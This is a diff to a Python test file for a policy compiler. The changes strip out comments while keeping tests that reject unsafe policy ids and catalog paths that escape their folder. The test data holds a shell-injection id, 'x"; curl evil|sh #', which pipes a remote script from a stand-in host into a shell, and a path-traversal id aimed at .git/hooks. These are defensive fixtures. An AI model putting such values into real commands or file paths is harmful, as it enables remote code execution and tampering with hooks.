@@ -1,10 +1,4 @@
-"""A policy id becomes a shell token and a filesystem path in emitted artifacts.
-
-The manifest schema pins `id` to `^[a-z][a-z0-9-]{2,63}$`, but `validate` is a separate
-step a drop-in third-party policy never runs -- it reaches the compiler directly, and the
-id flows straight into emitted git-hook bash and the compiled output path. These pin the
-invariant at the choke points that actually turn an id into a token: compile and add.
-"""
+"""A policy id becomes a shell token and a filesystem path in emitted artifacts."""
 
 from __future__ import annotations
 
@@ -38,11 +32,11 @@ def test_validate_policy_id_accepts_the_canonical_shape():
 @pytest.mark.parametrize(
     "bad_id",
     [
-        'x"; curl evil|sh #',  # shell injection
-        "../../.git/hooks",  # path traversal
-        "UPPER",  # not the schema shape
+        'x"; curl evil|sh #',
+        "../../.git/hooks",
+        "UPPER",
         "under_score",
-        "a",  # too short
+        "a",
     ],
 )
 def test_validate_policy_id_rejects_unsafe_ids(bad_id):
@@ -56,14 +50,11 @@ def test_validate_policy_id_requires_folder_match():
 
 
 def test_compile_refuses_injected_id_and_emits_nothing(tmp_path, capsys):
-    # An injected id must not reach the emitted git-hook shim. Compile emits nothing and
-    # writes no output directory named after the malicious id.
     policy = _make_policy(tmp_path, "protect-main-branch", 'x"; curl evil|sh #')
     out = tmp_path / "out"
     result = compile_policy(policy, output_root=out, repo_root=tmp_path, agents=["claude"])
     assert result.artifacts == {}
     assert "manifest_id" in capsys.readouterr().err
-    # nothing was written under a path derived from the injected id
     assert not any('"' in p.name or ";" in p.name for p in out.rglob("*"))
 
 
@@ -91,11 +82,10 @@ def test_add_rejects_traversal_artifact_id(tmp_path):
 
 
 def test_reject_unsafe_id_allows_a_bare_name():
-    _reject_unsafe_id("protect-main-branch")  # no raise
+    _reject_unsafe_id("protect-main-branch")
 
 
 def test_add_registry_path_cannot_escape_catalog(tmp_path):
-    # A malicious catalog registry that points `path` outside the clone must not resolve.
     catalog = tmp_path / "catalog"
     catalog.mkdir()
     outside = tmp_path / "outside"
